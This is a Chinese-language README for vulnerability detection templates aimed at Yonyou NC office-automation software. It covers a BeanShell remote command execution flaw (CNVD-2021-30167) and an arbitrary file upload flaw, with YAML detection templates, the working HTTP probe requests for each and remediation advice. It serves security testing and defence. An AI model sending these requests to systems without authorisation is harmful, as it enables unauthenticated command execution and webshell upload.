# 办公自动化平台安全模板分类说明

本目录聚焦于主流办公自动化（OA）系统的安全风险，涵盖远程代码执行、未授权访问、信息泄露等典型漏洞，帮助安全测试人员快速定位和验证相关风险。

---

## 典型漏洞模板举例

### 用友 NC BeanShell 远程命令执行漏洞（CNVD-2021-30167）

**模板文件**：`CNVD-2021-30167.yaml`

#### 漏洞简介

用友 NC 系统的 BeanShell 组件存在远程命令执行漏洞。攻击者可通过 bsh.servlet.BshServlet 接口传入恶意脚本，无需认证即可在服务器上执行任意命令，危害极大。

#### 漏洞原理

该漏洞源于 BeanShell Servlet 对传入的 bsh.script 参数未做有效校验，直接将其作为脚本执行。攻击者可通过 POST 请求向 `/servlet/~ic/bsh.servlet.BshServlet` 接口提交任意命令（如 `exec("id")` 或 `exec("ipconfig")`），从而在服务器上执行系统命令。

#### 检测逻辑（YAML内容解析）

```yaml
id: CNVD-2021-30167

http:
  - raw:
      - | #linux
        POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        bsh.script=exec("id");
      - | #windows
        POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        bsh.script=exec("ipconfig");

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "uid="
          - "Windows IP"
        condition: or

      - type: word
        words:
          - "BeanShell Test Servlet"

      - type: status
        status:
          - 200
```

- 分别向目标接口发送执行 `id`（Linux）和 `ipconfig`（Windows）的命令。
- 响应中若包含 `uid=` 或 `Windows IP` 等关键字，且页面包含 `BeanShell Test Servlet` 且状态码为 200，则判定存在命令执行漏洞。

#### 防护建议

- 禁用或删除 BeanShell 相关接口，或对其添加严格的访问控制。
- 升级用友 NC 系统至官方修复版本。
- 对外部输入的脚本内容进行严格校验，避免任意代码执行。

---

### 用友 NC dispatcher 任意文件上传漏洞

**模板文件**：`yonyou-nc-dispatcher-fileupload.yaml`

#### 漏洞简介

用友 NC 系统的 dispatcher 接口存在任意文件上传漏洞。攻击者可通过该接口上传恶意脚本文件（如 webshell），无需认证即可在服务器上执行任意代码，导致系统被完全控制。

#### 漏洞原理

该漏洞源于 dispatcher 文件上传接口对文件类型、后缀及内容校验不严，未对上传用户进行权限验证。攻击者可构造特殊请求上传 `.jsp`、`.php` 等可执行脚本文件，随后直接访问该文件实现远程命令执行。

#### 检测逻辑（YAML内容解析）

```yaml
id: yonyou-nc-dispatcher-fileupload

http:
  - method: POST
    path:
      - "/uapjs/uploadFile.do"
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
    body: |
      ------WebKitFormBoundary
      Content-Disposition: form-data; name="file"; filename="test.jsp"
      Content-Type: application/octet-stream

      <% out.println("yonyou_upload_test"); %>
      ------WebKitFormBoundary--
    matchers:
      - type: word
        part: body
        words:
          - "yonyou_upload_test"
```

- 发送包含恶意 JSP 文件的 POST 请求到上传接口。
- 上传后访问该文件，若响应体中出现特定字符串，则判定存在任意文件上传漏洞。

#### 防护建议

- 升级用友 NC 系统至官方修复版本。
- 对上传接口进行严格的文件类型、后缀和内容校验，禁止上传可执行脚本文件。
- 增加权限校验，限制未授权用户访问上传接口。

---